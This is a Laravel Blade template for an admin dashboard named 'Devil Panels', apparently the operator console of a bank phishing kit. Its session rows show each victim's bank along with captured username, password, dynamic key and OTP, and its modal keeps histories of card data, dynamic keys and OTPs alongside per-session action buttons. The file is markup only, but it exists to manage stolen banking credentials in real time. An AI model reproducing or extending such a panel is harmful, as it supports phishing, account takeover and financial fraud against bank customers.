@extends('admin.layouts.app')

@section('title', 'Dashboard')
@section('header_title', 'Devil Panels')
@section('page_id', 'dashboard')

@section('content')
  <div class="wrap">
    <div class="card">
      <div class="cardHeader">
        <h2>Sesiones</h2>
        <!-- <div class="search">
          <span style="opacity:.7;font-size:12px;">🔎</span>
          <input id="q" placeholder="Buscar por id/user/estado..." />
        </div> -->
      </div>
      <div class="cardBody">
        <div id="sessionsList"></div>
      </div>
    </div>

    <div class="card detailCardDesktop">
      <div class="cardHeader">
        <h2>Detalle</h2>
        <div class="pill"><b>Session:</b>&nbsp;<span id="selectedId">—</span></div>
      </div>

      <div class="detailTop" id="detailTop">Selecciona una sesión.</div>
      <div class="actions" id="actions"></div>
      <pre id="detailBox">{}</pre>
    </div>
  </div>

  {{-- Modal mobile (igual que ya lo tienes) --}}
  <div class="modalOverlay" id="modalOverlay" aria-hidden="true">
    <div class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
      <div class="modalHeader">
        <div class="title" id="modalTitle">
          <span id="modalDot"></span>
          <span class="mid" id="modalSessionId">—</span>
          <span class="stateText" id="modalState">—</span>
        </div>
        <button class="iconBtn" id="closeModalBtn" aria-label="Cerrar">✕</button>
      </div>

      <div class="modalBody">
        <div class="pill" style="display:inline-flex;margin:10px 0 0;" id="modalActionPill">action: —</div>
        <div class="modalPre">
          <div id="modalFocusBox">{}</div>
        </div>
        <div id="modalCCHistoryBox" class="modalHistory">{}</div>
        <div id="modalLogoHistoryBox" class="modalHistory">{}</div>
        <div id="modalDinaHistoryBox" class="modalHistory">{}</div>
        <div id="modalOtpHistoryBox" class="modalHistory">{}</div>
        <div id="modalOtherHistoryBox">{}</div>
      </div>

      <div class="modalActions" id="modalActions"></div>
    </div>
  </div>

  {{-- Templates del dashboard (para no tener HTML en JS) --}}
  <!-- ===== Templates ===== -->
  <template id="tpl-session-row">
    <div class="row">
      <!-- TOP -->
      <div class="rowTop">
        <div class="topLeft">
          <span class="dot" data-part="stateDot"></span>
          <span class="sid" data-part="sid"></span>
        </div>

        <div class="pill actionPill" data-field="action"></div>
      </div>

      <!-- BOTTOM -->
      <div class="rowBottom">
        <div class="bankPill" data-field="bank"></div>

        <div class="metaRight">
          <span class="kv"><b>user</b> <span data-field="user"></span></span>
          <span class="kv"><b>pass</b> <span data-field="pass"></span></span>
          <span class="kv"><b>dinamic</b> <span data-field="dinamic"></span></span>
          <span class="kv"><b>otp</b> <span data-field="otp"></span></span>
        </div>
      </div>
    </div>
  </template>

  <template id="tpl-action-btn">
    <button type="button"></button>
  </template>

  <template id="tpl-action-info">
    <span class="mutedInfo"></span>
  </template>

  <template id="tpl-detail-top">
    <span class="detailLeft" style="display:inline-flex;align-items:center;gap:10px;">
      <span class="dot"></span>
      <span>Estado: <b class="detailState" style="color:rgba(255,255,255,.92)"></b></span>
    </span>
    <span>Acción: <b class="detailAction" style="color:rgba(255,255,255,.92)"></b></span>
  </template>
@endsection